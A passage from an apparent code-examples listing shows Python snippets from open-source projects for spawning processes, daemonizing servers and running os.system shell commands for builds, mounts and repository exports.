                                     True, # Inheritable by new processes.
                                     DUPLICATE_SAME_ACCESS)
            env['JPY_PARENT_PID'] = str(int(handle))

        proc = Popen(cmd, **kwargs)

        # Attach the interrupt event to the Popen objet so it can be used later.
        proc.win32_interrupt_event = interrupt_event

    else:
        if independent:
            kwargs['preexec_fn'] = lambda: os.setsid()
        else:
            env['JPY_PARENT_PID'] = str(os.getpid())

        proc = Popen(cmd, **kwargs)

    # Clean up pipes created to work around Popen bug.
    if redirect_in:
        if stdin is None:
            proc.stdin.close()

    return proc

 
Example 49
From project apple, under directory lib/python2.6/site-packages/Spawning-0.9.3rc4-py2.6.egg/spawning, in source file spawning_controller.py.
Score: 5
vote
vote
def main():
    current_directory = os.path.realpath('.')
    if current_directory not in sys.path:
        sys.path.append(current_directory)

    parser = optparse.OptionParser(description="Spawning is an easy-to-use and flexible wsgi server. It supports graceful restarting so that your site finishes serving any old requests while starting new processes to handle new requests with the new code. For the simplest usage, simply pass the dotted path to your wsgi application: 'spawn my_module.my_wsgi_app'", version=spawning.__version__)
    parser.add_option('-v', '--verbose', dest='verbose', action='store_true', help='Display verbose configuration '
        'information when starting up or restarting.')
    parser.add_option("-f", "--factory", dest='factory', default='spawning.wsgi_factory.config_factory',
        help="""Dotted path (eg mypackage.mymodule.myfunc) to a callable which takes a dictionary containing the command line arguments and figures out what needs to be done to start the wsgi application. Current valid values are: spawning.wsgi_factory.config_factory, spawning.paste_factory.config_factory, and spawning.django_factory.config_factory. The factory used determines what the required positional command line arguments will be. See the spawning.wsgi_factory module for documentation on how to write a new factory.
        """)
    parser.add_option("-i", "--host",
        dest='host', default=DEFAULTS['host'],
        help='The local ip address to bind.')
    parser.add_option("-p", "--port",
        dest='port', type='int', default=DEFAULTS['port'],
        help='The local port address to bind.')
    parser.add_option("-s", "--processes",
        dest='processes', type='int', default=DEFAULTS['num_processes'],
        help='The number of unix processes to start to use for handling web i/o.')
    parser.add_option("-t", "--threads",
        dest='threads', type='int', default=DEFAULTS['threadpool_workers'],
        help="The number of posix threads to use for handling web requests. "
            "If threads is 0, do not use threads but instead use eventlet's cooperative "
            "greenlet-based microthreads, monkeypatching the socket and pipe operations which normally block "
            "to cooperate instead. Note that most blocking database api modules will not "
            "automatically cooperate.")
    parser.add_option('-d', '--daemonize', dest='daemonize', action='store_true',
        help="Daemonize after starting children.")
    parser.add_option('-u', '--chuid', dest='chuid', metavar="ID",
        help="Change user ID in daemon mode (and group ID if given, "
             "separate with colon.)")
    parser.add_option('--pidfile', dest='pidfile', metavar="FILE",
        help="Write own process ID to FILE in daemon mode.")
    parser.add_option('--stdout', dest='stdout', metavar="FILE",
        help="Redirect stdout to FILE in daemon mode.")
    parser.add_option('--stderr', dest='stderr', metavar="FILE",
        help="Redirect stderr to FILE in daemon mode.")
    parser.add_option('-w', '--watch', dest='watch', action='append',
        help="Watch the given file's modification time. If the file changes, the web server will "
            'restart gracefully, allowing old requests to complete in the old processes '
            'while starting new processes with the latest code or configuration.')
    ## TODO Hook up the svn reloader again
    parser.add_option("-r", "--reload",
        type='str', dest='reload',
        help='If --reload=dev is passed, reload any time '
        'a loaded module or configuration file changes.')
    parser.add_option("--deadman", "--deadman_timeout",
        type='int', dest='deadman_timeout', default=DEFAULTS['deadman_timeout'],
        help='When killing an old i/o process because the code has changed, don\'t wait '
        'any longer than the deadman timeout value for the process to gracefully exit. '
        'If all requests have not completed by the deadman timeout, the process will be mercilessly killed.')
    parser.add_option('-l', '--access-log-file', dest='access_log_file', default=None,
        help='The file to log access log lines to. If not given, log to stdout. Pass /dev/null to discard logs.')
    parser.add_option('-c', '--coverage', dest='coverage', action='store_true',
        help='If given, gather coverage data from the running program and make the '
            'coverage report available from the /_coverage url. See the figleaf docs '
            'for more info: http://darcs.idyll.org/~t/projects/figleaf/doc/')
    parser.add_option('-m', '--max-memory', dest='max_memory', type='int', default=0,
        help='If given, the maximum amount of memory this instance of Spawning '
            'is allowed to use. If all of the processes started by this Spawning controller '
            'use more than this amount of memory, send a SIGHUP to the controller '
            'to get the children to restart.')
    parser.add_option('--backdoor', dest='backdoor', action='store_true',
            help='Start a backdoor bound to localhost:3000')
    parser.add_option('-a', '--max-age', dest='max_age', type='int',
        help='If given, the maximum amount of time (in seconds) an instance of spawning_child '
            'is allowed to run. Once this time limit has expired a SIGHUP will be sent to '
            'spawning_controller, causing it to restart all of the child processes.')
    parser.add_option('--no-keepalive', dest='no_keepalive', action='store_true',
            help='Disable HTTP/1.1 KeepAlive')
    parser.add_option('-z', '--z-restart-args', dest='restart_args',
        help='For internal use only')

    options, positional_args = parser.parse_args()

    if len(positional_args) < 1 and not options.restart_args:
        parser.error("At least one argument is required. "
            "For the default factory, it is the dotted path to the wsgi application "
            "(eg my_package.my_module.my_wsgi_application). For the paste factory, it "
            "is the ini file to load. Pass --help for detailed information about available options.")

    if options.backdoor:
        try:
            eventlet.spawn(eventlet.backdoor.backdoor_server, eventlet.listen(('localhost', 3000)))
        except Exception, ex:
            sys.stderr.write('**> Error opening backdoor: %s\n' % ex)

    sock = None

    if options.restart_args:
        restart_args = json.loads(options.restart_args)
        factory = restart_args['factory']
        factory_args = restart_args['factory_args']

        start_delay = restart_args.get('start_delay')
        if start_delay is not None:
            factory_args['start_delay'] = start_delay
            print "(%s) delaying startup by %s" % (os.getpid(), start_delay)
            time.sleep(start_delay)

        fd = restart_args.get('fd')
        if fd is not None:
            sock = socket.fromfd(restart_args['fd'], socket.AF_INET, socket.SOCK_STREAM)
            ## socket.fromfd doesn't result in a socket object that has the same fd.
            ## The old fd is still open however, so we close it so we don't leak.
            os.close(restart_args['fd'])
        return start_controller(sock, factory, factory_args)

    ## We're starting up for the first time.
    if options.daemonize:
        # Do the daemon dance. Note that this isn't what is considered good
        # daemonization, because frankly it's convenient to keep the file
        # descriptiors open (especially when there are prints scattered all
        # over the codebase.)
        # What we do instead is fork off, create a new session, fork again.
        # This leaves the process group in a state without a session
        # leader.
        pid = os.fork()
        if not pid:
            os.setsid()
            pid = os.fork()
            if pid:
                os._exit(0)
        else:
            os._exit(0)
        print "(%s) now daemonized" % (os.getpid(),)
        # Close _all_ open (and othewise!) files.
        import resource
        maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
        if maxfd == resource.RLIM_INFINITY:
            maxfd = 4096
        for fdnum in xrange(maxfd):
            try:
                os.close(fdnum)
            except OSError, e:
                if e.errno != errno.EBADF:
                    raise
        # Remap std{in,out,err}
        devnull = os.open(os.path.devnull, os.O_RDWR)
        oflags = os.O_WRONLY | os.O_CREAT | os.O_APPEND
        if devnull != 0:  # stdin
            os.dup2(devnull, 0)
        if options.stdout:
            stdout_fd = os.open(options.stdout, oflags)
            if stdout_fd != 1:
                os.dup2(stdout_fd, 1)
                os.close(stdout_fd)
        else:
            os.dup2(devnull, 1)
        if options.stderr:
            stderr_fd = os.open(options.stderr, oflags)
            if stderr_fd != 2:
                os.dup2(stderr_fd, 2)
                os.close(stderr_fd)
        else:
            os.dup2(devnull, 2)
        # Change user & group ID.
        if options.chuid:
            user, group = set_process_owner(options.chuid)
            print "(%s) set user=%s group=%s" % (os.getpid(), user, group)
    else:
        # Become a process group leader only if not daemonizing.
        os.setpgrp()

    ## Fork off the thing that watches memory for this process group.
    controller_pid = os.getpid()
    if options.max_memory and not os.fork():
        env = environ()
        from spawning import memory_watcher
        basedir, cmdname = os.path.split(memory_watcher.__file__)
        if cmdname.endswith('.pyc'):
            cmdname = cmdname[:-1]

        os.chdir(basedir)
        command = [
            sys.executable,
            cmdname,
            '--max-age', str(options.max_age),
            str(controller_pid),
            str(options.max_memory)]
        os.execve(sys.executable, command, env)

    factory = options.factory

    # If you tell me to watch something, I'm going to reload then
    if options.watch:
        options.reload = True

    factory_args = {
        'verbose': options.verbose,
        'host': options.host,
        'port': options.port,
        'num_processes': options.processes,
        'threadpool_workers': options.threads,
        'watch': options.watch,
        'reload': options.reload,
        'deadman_timeout': options.deadman_timeout,
        'access_log_file': options.access_log_file,
        'pidfile': options.pidfile,
        'coverage': options.coverage,
        'no_keepalive' : options.no_keepalive,
        'max_age' : options.max_age,
        'argv_str': " ".join(sys.argv[1:]),
        'args': positional_args,
    }
    start_controller(sock, factory, factory_args)

 
Example 50
From project portfolio, under directory flask/lib/python2.7/site-packages/gunicorn, in source file util.py.
Score: 5
vote
vote
def daemonize(enable_stdio_inheritance=False):
    """\
    Standard daemonization of a process.
    http://www.svbug.com/documentation/comp.unix.programmer-FAQ/faq_2.html#SEC16
    """
    if not 'GUNICORN_FD' in os.environ:
        if os.fork():
            os._exit(0)
        os.setsid()

        if os.fork():
            os._exit(0)

        os.umask(0)

        # In both the following any file descriptors above stdin
        # stdout and stderr are left untouched. The inheritence
        # option simply allows one to have output go to a file
        # specified by way of shell redirection when not wanting
        # to use --error-log option.

        if not enable_stdio_inheritance:
            # Remap all of stdin, stdout and stderr on to
            # /dev/null. The expectation is that users have
            # specified the --error-log option.

            closerange(0, 3)

            fd_null = os.open(REDIRECT_TO, os.O_RDWR)

            if fd_null != 0:
                os.dup2(fd_null, 0)

            os.dup2(fd_null, 1)
            os.dup2(fd_null, 2)

        else:
            fd_null = os.open(REDIRECT_TO, os.O_RDWR)

            # Always redirect stdin to /dev/null as we would
            # never expect to need to read interactive input.

            if fd_null != 0:
                os.close(0)
                os.dup2(fd_null, 0)

            # If stdout and stderr are still connected to
            # their original file descriptors we check to see
            # if they are associated with terminal devices.
            # When they are we map them to /dev/null so that
            # are still detached from any controlling terminal
            # properly. If not we preserve them as they are.
            #
            # If stdin and stdout were not hooked up to the
            # original file descriptors, then all bets are
            # off and all we can really do is leave them as
            # they were.
            #
            # This will allow 'gunicorn ... > output.log 2>&1'
            # to work with stdout/stderr going to the file
            # as expected.
            #
            # Note that if using --error-log option, the log
            # file specified through shell redirection will
            # only be used up until the log file specified
            # by the option takes over. As it replaces stdout
            # and stderr at the file descriptor level, then
            # anything using stdout or stderr, including having
            # cached a reference to them, will still work.

            def redirect(stream, fd_expect):
                try:
                    fd = stream.fileno()
                    if fd == fd_expect and stream.isatty():
                        os.close(fd)
                        os.dup2(fd_null, fd)
                except AttributeError:
                    pass

            redirect(sys.stdout, 1)
            redirect(sys.stderr, 2)


 
Example 51
From project SublimePackages, under directory SublimeCodeIntel/libs, in source file process.py.
Score: 5
vote
vote
def __init__(self, cmd, cwd=None, env=None, flags=None,
                 stdin=PIPE, stdout=PIPE, stderr=PIPE,
                 universal_newlines=True):
        """Create a child process.

        "cmd" is the command to run, either a list of arguments or a string.
        "cwd" is a working directory in which to start the child process.
        "env" is an environment dictionary for the child.
        "flags" are system-specific process creation flags. On Windows
            this can be a bitwise-OR of any of the win32process.CREATE_*
            constants (Note: win32process.CREATE_NEW_PROCESS_GROUP is always
            OR'd in). On Unix, this is currently ignored.
        "stdin", "stdout", "stderr" can be used to specify file objects
            to handle read (stdout/stderr) and write (stdin) events from/to
            the child. By default a file handle will be created for each
            io channel automatically, unless set explicitly to None. When set
            to None, the parent io handles will be used, which can mean the
            output is redirected to Komodo's log files.
        "universal_newlines": On by default (the opposite of subprocess).
        """
        self._child_created = False
        self.__use_killpg = False
        auto_piped_stdin = False
        preexec_fn = None
        shell = False
        if not isinstance(cmd, (list, tuple)):
            # The cmd is the already formatted, ready for the shell. Otherwise
            # subprocess.Popen will treat this as simply one command with
            # no arguments, resulting in an unknown command.
            shell = True
        if sys.platform.startswith("win"):
            # On Windows, cmd requires some special handling of multiple quoted
            # arguments, as this is what cmd will do:
            #    See if the first character is a quote character and if so,
            #    strip the leading character and remove the last quote character
            #    on the command line, preserving any text after the last quote
            #    character.
            if cmd and shell and cmd.count('"') > 2:
                if not cmd.startswith('""') or not cmd.endswith('""'):
                    # Needs to be a re-quoted with additional double quotes.
                    # http://bugs.activestate.com/show_bug.cgi?id=75467
                    cmd = '"%s"' % (cmd, )

            # XXX - subprocess needs to be updated to use the wide string API.
            # subprocess uses a Windows API that does not accept unicode, so
            # we need to convert all the environment variables to strings
            # before we make the call. Temporary fix to bug:
            #   http://bugs.activestate.com/show_bug.cgi?id=72311
            if env:
                encoding = sys.getfilesystemencoding()
                _enc_env = {}
                for key, value in env.items():
                    try:
                        _enc_env[key.encode(encoding)] = value.encode(encoding)
                    except (UnicodeEncodeError, UnicodeDecodeError):
                        # Could not encode it, warn we are dropping it.
                        log.warn("Could not encode environment variable %r "
                                 "so removing it", key)
                env = _enc_env

            if flags is None:
                flags = CREATE_NO_WINDOW

            # If we don't have standard handles to pass to the child process
            # (e.g. we don't have a console app), then
            # `subprocess.GetStdHandle(...)` will return None. `subprocess.py`
            # handles that (http://bugs.python.org/issue1124861)
            #
            # However, if Komodo is started from the command line, then
            # the shell's stdin handle is inherited, i.e. in subprocess.py:
            #      p2cread = GetStdHandle(STD_INPUT_HANDLE)   # p2cread == 3
            # A few lines later this leads to:
            #    Traceback (most recent call last):
            #      ...
            #      File "...\lib\mozilla\python\komodo\process.py", line 130, in __init__
            #        creationflags=flags)
            #      File "...\lib\python\lib\subprocess.py", line 588, in __init__
            #        errread, errwrite) = self._get_handles(stdin, stdout, stderr)
            #      File "...\lib\python\lib\subprocess.py", line 709, in _get_handles
            #        p2cread = self._make_inheritable(p2cread)
            #      File "...\lib\python\lib\subprocess.py", line 773, in _make_inheritable
            #        DUPLICATE_SAME_ACCESS)
            #    WindowsError: [Error 6] The handle is invalid
            #
            # I suspect this indicates that the stdin handle inherited by
            # the subsystem:windows komodo.exe process is invalid -- perhaps
            # because of mis-used of the Windows API for passing that handle
            # through. The same error can be demonstrated in PythonWin:
            #   from _subprocess import *
            #   from subprocess import *
            #   h = GetStdHandle(STD_INPUT_HANDLE)
            #   p = Popen("python -c '1'")
            #   p._make_interitable(h)
            #
            # I don't understand why the inherited stdin is invalid for
            # `DuplicateHandle`, but here is how we are working around this:
            # If we detect the condition where this can fail, then work around
            # it by setting the handle to `subprocess.PIPE`, resulting in
            # a different and workable code path.
            if self._needToHackAroundStdHandles() \
                    and not (flags & CREATE_NEW_CONSOLE):
                if self._checkFileObjInheritable(sys.stdin, "STD_INPUT_HANDLE"):
                    stdin = PIPE
                    auto_piped_stdin = True
                if self._checkFileObjInheritable(sys.stdout, "STD_OUTPUT_HANDLE"):
                    stdout = PIPE
                if self._checkFileObjInheritable(sys.stderr, "STD_ERROR_HANDLE"):
                    stderr = PIPE
        else:
            # Set flags to 0, subprocess raises an exception otherwise.
            flags = 0
            # Set a preexec function, this will make the sub-process create it's
            # own session and process group - bug 80651, bug 85693.
            preexec_fn = os.setsid
            # Mark as requiring progressgroup killing. This will allow us to
            # later kill both the spawned shell and the sub-process in one go
            # (see the kill method) - bug 85693.
            self.__use_killpg = True

        # Internal attributes.
        self.__cmd = cmd
        self.__retval = None
        self.__hasTerminated = threading.Condition()

        # Launch the process.
        # print "Process: %r in %r" % (cmd, cwd)
        Popen.__init__(self, cmd, cwd=cwd, env=env, shell=shell,
                       stdin=stdin, stdout=stdout, stderr=stderr,
                       preexec_fn=preexec_fn,
                       universal_newlines=universal_newlines,
                       creationflags=flags)
        if auto_piped_stdin:
            self.stdin.close()

     
}
#Python os.system Examples
{
Python os.system Examples

The following are 58 code examples for showing how to use os.system. They are extracted from open source Python projects. You can click  vote to vote up the examples you like, or click  vote to vote down the exmaples you don't like. Your votes will be used in our system to extract more high-quality examples.
You may also check out all available functions/classes of the module os	, or try the search function   .

Example 1
From project hipl, under directory pjproject/tests/cdash, in source file builder.py.
Score: 19
vote
vote
def build_pjsua_test_ops(pjsua_exe=""):
    ops = []
    if pjsua_exe:
        exe = " -e ../../pjsip-apps/bin/" + pjsua_exe
    else:
        exe = ""
    cwd = os.getcwd()
    os.chdir("../pjsua")
    os.system("python runall.py --list > list")
    f = open("list", "r")
    for e in f:
        e = e.rstrip("\r\n ")
        (mod,param) = e.split(None,2)
        name = mod[4:mod.find(".py")] + "_" + \
               param[param.find("/")+1:param.find(".py")]
        ops.append(Operation(Operation.TEST, "python run.py" + exe + " " + \
                             e, name=name, wdir="tests/pjsua"))
    f.close()
    os.remove("list") 
    os.chdir(cwd)
    return ops

#
# Get gcc version
#
 
Example 2
From project CommercialDetection-master, under directory src, in source file ffmpeg.py.
Score: 10
vote
vote
def create_video(start, duration, video_src, video_dst, force_fps=False, fps=60):
    
    print
    print "Creating the video",video_dst
    os.system("ffmpeg -ss " + start + " -i " + video_src + " -t " + duration + " -acodec copy -vcodec copy " + video_dst + " -loglevel quiet")
    if force_fps:
        os.system("ffmpeg -ss " + video_dst + " -vf fps=1/" + str(fps) + " " + video_dst)
    print "Video created!!"
    print
    
 
Example 3
From project sinanet.gelso, under directory PasteScript-1.7.5-py2.7.egg/paste/script, in source file appinstall.py.
Score: 10
vote
vote
def run_editor(self):
        filenames = self.installer.editable_config_files(self.config_file)
        if filenames is None:
            print 'Warning: the config file is not known (--edit ignored)'
            return False
        if not filenames:
            print 'Warning: no config files need editing (--edit ignored)'
            return True
        if len(filenames) > 1:
            print 'Warning: there is more than one editable config file (--edit ignored)'
            return False
        if not os.environ.get('EDITOR'):
            print 'Error: you must set $EDITOR if using --edit'
            return False
        if self.verbose:
            print '%s %s' % (os.environ['EDITOR'], filenames[0])
        retval = os.system('$EDITOR %s' % filenames[0])
        if retval:
            print 'Warning: editor %s returned with error code %i' % (
                os.environ['EDITOR'], retval)
            return False
        return True
        
 

 
Example 4
From project aandete, under directory app/lib/python/PIL, in source file JpegImagePlugin.py.
Score: 10
vote
vote
def load_djpeg(self):

        # ALTERNATIVE: handle JPEGs via the IJG command line utilities

        import tempfile, os
        file = tempfile.mktemp()
        os.system("djpeg %s >%s" % (self.filename, file))

        try:
            self.im = Image.core.open_ppm(file)
        finally:
            try: os.unlink(file)
            except: pass

        self.mode = self.im.mode
        self.size = self.im.size

        self.tile = []

     
Example 5
From project aandete, under directory app/lib/python/PIL, in source file GifImagePlugin.py.
Score: 10
vote
vote
def _save_netpbm(im, fp, filename):

    #
    # If you need real GIF compression and/or RGB quantization, you
    # can use the external NETPBM/PBMPLUS utilities.  See comments
    # below for information on how to enable this.

    import os
    file = im._dump()
    if im.mode != "RGB":
        os.system("ppmtogif %s >%s" % (file, filename))
    else:
        os.system("ppmquant 256 %s | ppmtogif >%s" % (file, filename))
    try: os.unlink(file)
    except: pass


# --------------------------------------------------------------------
# GIF utilities

 
Example 6
From project fabric, under directory , in source file fabric.py.
Score: 10
vote
vote
def local(cmd, **kwargs):
    """
    Run a command locally.
    
    This operation is essentially `os.system()` except that variables are
    expanded prior to running.
    
    May take an additional `fail` keyword argument with one of these values:
    
     * ignore - do nothing on failure
     * warn - print warning on failure
     * abort - terminate fabric on failure
    
    Example:
    
        local("make clean dist", fail='abort')
    
    """
    # we don't need _escape_bash_specialchars for local execution
    final_cmd = _lazy_format(cmd)
    print("[localhost] run: " + final_cmd)
    retcode = subprocess.call(final_cmd, shell=True)
    if retcode != 0:
        _fail(kwargs, "Local command failed:\n" + _indent(final_cmd))

 
Example 7
From project VBigHatch, under directory mysite/profile/tasks, in source file __init__.py.
Score: 10
vote
vote
def run(self, **kwargs):
        # Generate the table...
        lines = mysite.profile.models.Forwarder.generate_list_of_lines_for_postfix_table()
        # Save it where Postfix expects it...
        fd = open(settings.POSTFIX_FORWARDER_TABLE_PATH, 'w')
        fd.write('\n'.join(lines))
        fd.close()
        # Update the Postfix forwarder database. Note that we do not need
        # to ask Postfix to reload. Yay!
        # FIXME stop using os.system()
        os.system('/usr/sbin/postmap /etc/postfix/virtual_alias_maps') 

 
Example 8
From project ants, under directory tools, in source file sandbox.py.
Score: 10
vote
vote
def release(self):
        """Release the sandbox for further use

        Unlocks and releases the jail for reuse by others.
        Must be called exactly once after Jail.is_alive == False.

        """
        if self.is_alive:
            raise SandboxError("Sandbox released while still alive")
        if not self.locked:
            raise SandboxError("Attempt to release jail that is already unlocked")
        if os.system("sudo umount %s" % (os.path.join(self.base_dir, "root"),)):
            raise SandboxError("Error returned from umount of jail %d"
                    % (self.number,))
        lock_dir = os.path.join(self.base_dir, "locked")
        pid_filename = os.path.join(lock_dir, "lock.pid")
        with open(pid_filename, 'r') as pid_file:
            lock_pid = int(pid_file.read())
            if lock_pid != os.getpid():
                # if we ever get here something has gone seriously wrong
                # most likely the jail locking mechanism has failed
                raise SandboxError("Jail released by different pid, name %s, lock_pid %d, release_pid %d"
                        % (self.name, lock_pid, os.getpid()))
        os.unlink(pid_filename)
        os.rmdir(lock_dir)
        self.locked = False

     
Example 9
From project moblin-image-creator.jaunty, under directory libs, in source file moblin_apt.py.
Score: 10
vote
vote
def mount(self, chroot_dir):
        """Mount stuff specific to apt-get"""
        mount_list = [
            # mnt_type, host_dirname, target_dirname, fs_type, device
            ('bind', '/var/cache/apt/archives', False, None, None),
        ]
        mounted_list = pdk_utils.mountList(mount_list, chroot_dir)
        if os.path.isfile(os.path.join(chroot_dir, '.buildroot')):
            # search for any file:// URL's in the configured apt repositories, and
            # when we find them make the equivalent directory in the new filesystem
            # and then mount --bind the file:// path into the filesystem.
            rdir = os.path.join(chroot_dir, 'etc', 'apt', 'sources.list.d')
            if os.path.isdir(rdir):
                for fname in os.listdir(rdir):
                    file = open(os.path.join(rdir, fname))
                    for line in file:
                        if re.search(r'^\s*deb file:\/\/\/', line):
                            p = line.split('file:///')[1].split(' ')[0]
                            new_mount = os.path.join(chroot_dir, p)
                            mounted_list.append(new_mount)
                            if not os.path.isdir(new_mount):
                                os.makedirs(new_mount)
                                os.system("mount --bind /%s %s" % (p, new_mount))
                    # Its no big deal if the repo is really empty, so
                    # ignore mount errors.
                    file.close()
        return mounted_list
 
Example 10
From project moblin-image-creator.jaunty, under directory libs, in source file pdk_utils.py.
Score: 10
vote
vote
def umount(dirname):
    """Helper function to un-mount a directory, returns back False if it failed
    to unmount the directory"""
    dirname = os.path.abspath(os.path.expanduser(dirname))
    result = os.system("umount %s" % (dirname))
    if result:
        # umount failed, see if the directory is actually mounted, if it isn't
        # then we think it is okay
        mounts = getMountInfo()
        if dirname in mounts:
            return False
    return True

 
Example 11
From project hipl, under directory tools, in source file dnsproxy.py.
Score: 10
vote
vote
def stop(self):
        self.restore_resolvconf_dnsmasq()
        os.system("ifconfig lo:53 down")
        # Sometimes hipconf processes get stuck, particularly when
        # hipd is busy or unresponsive. This is a workaround.
        os.system('killall --quiet hipconf 2>/dev/null')

 
Example 12
From project hipl, under directory pjproject/pjsip-apps/build, in source file get-footprint.py.
Score: 10
vote
vote
def get_size(all_flags, flags, desc):
	file = 'footprint.exe'
	# Remove file
	rc = os.system("make -f Footprint.mak FCFLAGS='" + all_flags + "' clean")
	# Make the executable
	cmd = "make -f Footprint.mak FCFLAGS='" + all_flags + "' all"
	#print cmd
	rc = os.system(cmd)
	if rc <> 0:
		sys.exit(1)

	# Run 'size' against the executable
	f = os.popen('size ' + file)
	# Skip header of the 'size' output
	f.readline()
	# Get the sizes
	size = f.readline()
	f.close()
	# Split into tokens
	tokens = size.split()
	# Build the size tuple and add to exe_size
	elem = all_flags, flags, tokens[0], tokens[1], tokens[2], desc
	exe_size.append(elem)
	# Remove file
	rc = os.system("make -f Footprint.mak FCFLAGS='" + all_flags + "' clean")
	
# Main
 
Example 13
From project adv-net-samples-master, under directory sdn/pox/tools, in source file pox-pydoc.py.
Score: 10
vote
vote
def getpager():
    """Decide what method to use for paging through text."""
    if type(sys.stdout) is not types.FileType:
        return plainpager
    if not sys.stdin.isatty() or not sys.stdout.isatty():
        return plainpager
    if 'PAGER' in os.environ:
        if sys.platform == 'win32': # pipes completely broken in Windows
            return lambda text: tempfilepager(plain(text), os.environ['PAGER'])
        elif os.environ.get('TERM') in ('dumb', 'emacs'):
            return lambda text: pipepager(plain(text), os.environ['PAGER'])
        else:
            return lambda text: pipepager(text, os.environ['PAGER'])
    if os.environ.get('TERM') in ('dumb', 'emacs'):
        return plainpager
    if sys.platform == 'win32' or sys.platform.startswith('os2'):
        return lambda text: tempfilepager(plain(text), 'more <')
    if hasattr(os, 'system') and os.system('(less) 2>/dev/null') == 0:
        return lambda text: pipepager(text, 'less')

    import tempfile
    (fd, filename) = tempfile.mkstemp()
    os.close(fd)
    try:
        if hasattr(os, 'system') and os.system('more "%s"' % filename) == 0:
            return lambda text: pipepager(text, 'more')
        else:
            return ttypager
    finally:
        os.unlink(filename)

 
Example 14
From project django-repositories, under directory repositories/management/commands, in source file repo_export.py.
Score: 10
vote
vote
def handle(self, *args, **options):
        os.chdir(settings.REPO_EXPORT_DIR)
        for repo in SourceRepository.objects.filter(anonymous_access=True):
            if repo.get_vc_system_display() == 'Subversion':
                os.system('svn export file://%s/trunk %s' % (repo.repo_path, repo.name) )
                os.system('zip -r %s.zip %s' % (repo.name, repo.name) )
                os.system('tar -czvf  %s.tgz %s' % (repo.name, repo.name) )
                os.system('rm -rf %s' % repo.name)
            elif repo.get_vc_system_display() == 'Git':
                os.system('git clone file://%s %s' % (repo.repo_path, repo.name) )
                os.chdir(repo.name)
                os.system('git archive master --format=zip -o ../%s.zip' % repo.name)
                os.system('git archive master --format=tar  | gzip > ../%s.tgz' % repo.name)
                os.chdir('..')
                os.system('rm -rf %s' % repo.name)
 
Example 15
From project cocos2d-x, under directory tools/jenkins-scripts, in source file ci-release-test.py.
Score: 10
vote
vote
def make_temp_dir():
    #make temp dir
    print "current dir is: " + os.environ['WORKSPACE']
    os.system("cd " + os.environ['WORKSPACE']);
    os.mkdir("android_build_objs")
    #add symbol link
    PROJECTS=["cpp-empty-test", "cpp-tests"]

    print platform.system()
    if(platform.system() == 'Darwin'):
        for item in PROJECTS:
          cmd = "ln -s " + os.environ['WORKSPACE']+"/android_build_objs/ " + os.environ['WORKSPACE']+"/tests/"+item+"/proj.android/obj"  
          os.system(cmd)
    elif(platform.system() == 'Windows'):
        for item in PROJECTS:
          p = item.replace("/", os.sep)
          cmd = "mklink /J "+os.environ['WORKSPACE']+os.sep+"tests"+os.sep +p+os.sep+"proj.android"+os.sep+"obj " + os.environ['WORKSPACE']+os.sep+"android_build_objs"
          print cmd
          os.system(cmd)

 
Example 16
From project cocos2d-x, under directory tools/jenkins-scripts/configs, in source file cocos-2dx-develop-base-repo.py.
Score: 10
vote
vote
def check_ret(ret):
  if(ret != 0):
    os.system('git checkout -B develop remotes/origin/develop')
    os.system('git clean -xdf -f')
    sys.exit(1)

 
Example 17
From project cocos2d-x, under directory tools/jenkins-scripts, in source file autotest.py.
Score: 10
vote
vote
def MAC_BUILD():
	def cleanProj():
		infoClean = os.system('xcodebuild -project ./build/cocos2d_tests.xcodeproj -target cpp-tests\ Mac clean')
		print 'infoClean: ', infoClean
		if infoClean != 0:
			return False
		time.sleep(sleep_time)
		return True
	def buildProj():
		infoBuild = os.system('xcodebuild -project ./build/cocos2d_tests.xcodeproj -target cpp-tests\ Mac')
		print 'infoBuild: ', infoBuild
		if infoBuild != 0:
			return False
		time.sleep(sleep_time)
		return True
	def openProj():
		cmd = 'open ./build/build/Debug/cpp-tests\ Mac.app'
		print 'cmd: ', cmd
		infoOpen = os.system(cmd)
		print 'infoOpen: ', infoOpen
		if infoOpen != 0:
			return False
		time.sleep(sleep_time)
		return True
	def buildAndRun():
		if not cleanProj():
			print '**CLEAN FAILED**'
		if not buildProj():
			print '**BUILD FAILED**'
			return False
		if not openProj():
			return False
		time.sleep(sleep_time)
		return True
	return buildAndRun()
#----------------autotest build and run end----------------#

 
Example 18
From project cocos2d-x, under directory tools/jenkins-scripts, in source file pull-request-builder.py.
Score: 10
vote
vote
def check_current_3rd_libs(branch):
    #get current_libs config
    backup_files = range(2)
    current_files = range(2)
    config_file_paths = ['external/config.json','templates/lua-template-runtime/runtime/config.json']
    if (branch == 'v2'):
        config_file_paths = ['external/config.json']
        backup_files = range(1)
        current_files = range(1)
    for i, config_file_path in enumerate(config_file_paths):
        if not os.path.isfile(config_file_path):
            raise Exception("Could not find 'external/config.json'")

        with open(config_file_path) as data_file:
            data = json.load(data_file)

        current_3rd_libs_version = data["version"]
        filename = current_3rd_libs_version + '.zip'
        node_name = os.environ['NODE_NAME']
        backup_file = '../../../cocos-2dx-external/node/' + node_name + '/' + filename
        backup_files[i] = backup_file
        current_file = filename
        current_files[i] = current_file
        if os.path.isfile(backup_file):
          copy(backup_file, current_file)
    #run download-deps.py
    os.system('python download-deps.py -r no')
    #backup file
    for i, backup_file in enumerate(backup_files):
        current_file = current_files[i]
        copy(current_file, backup_file)

 
Example 19
From project hubjs, under directory tools/scons, in source file scons-time.py.
Score: 10
vote
vote
def execute(self, action, *args):
        """
        Executes the specified action.

        The action is called if it's a callable Python function, and
        otherwise passed to os.system().
        """
        if callable(action):
            action(*args)
        else:
            os.system(action % args)

     
Example 20
From project hubjs, under directory tools/scons/scons-local-1.2.0/SCons/Platform, in source file posix.py.
Score: 10
vote
vote
def exec_spawnvpe(l, env):
    stat = os.spawnvpe(os.P_WAIT, l[0], l, env)
    # os.spawnvpe() returns the actual exit code, not the encoding
    # returned by os.waitpid() or os.system().
    return stat

 
Example 21
From project pokecrystal-demo, under directory extras, in source file tests.py.
Score: 10
vote
vote
def test_write_all_labels(self):
        """dumping json into a file"""
        filename = "test_labels.json"
        # remove the current file
        if os.path.exists(filename):
            os.system("rm " + filename)
        # make up some labels
        labels = []
        # fake label 1
        label = {"line_number": 5, "bank": 0, "label": "SomeLabel", "address": 0x10}
        labels.append(label)
        # fake label 2
        label = {"line_number": 15, "bank": 2, "label": "SomeOtherLabel", "address": 0x9F0A}
        labels.append(label)
        # dump to file
        write_all_labels(labels, filename=filename)
        # open the file and read the contents
        file_handler = open(filename, "r")
        contents = file_handler.read()
        file_handler.close()
        # parse into json
        obj = json.read(contents)
        # begin testing
        self.assertEqual(len(obj), len(labels))
